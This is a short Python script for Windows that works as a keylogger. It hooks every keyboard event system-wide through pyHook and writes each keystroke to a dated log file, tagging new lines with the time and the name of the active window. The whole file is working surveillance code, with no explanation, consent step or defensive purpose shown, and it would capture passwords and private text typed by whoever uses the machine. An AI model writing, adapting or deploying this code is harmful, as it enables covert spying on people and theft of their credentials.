import pyHook, pythoncom, time # winsound, sys, logging, os 

date = "\\Logs\\"
date += time.strftime("%d.%m.%Y") + ".txt" 
x = time.ctime()
with open(date, "a") as f:
            f.write("\n")
            f.write("[" + x + "] : " )


def OnKeyboardEvent(event):
    global x 

    if event.Key =="Return" :
        with open(date, "a") as f:
            f.write(" {Enter}\n")
            f.write("[" + x +"|"+event.WindowName + "] : " )

    elif event.Key == "Space" :
        with open(date, "a") as f:
            f.write(" ")
    elif event.Key == "Back" :
        with open(date, "a") as f:
            f.write("{Bkspc}")
        
    else :
        with open(date, "a") as f:
            f.write(event.Key)
        
        
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

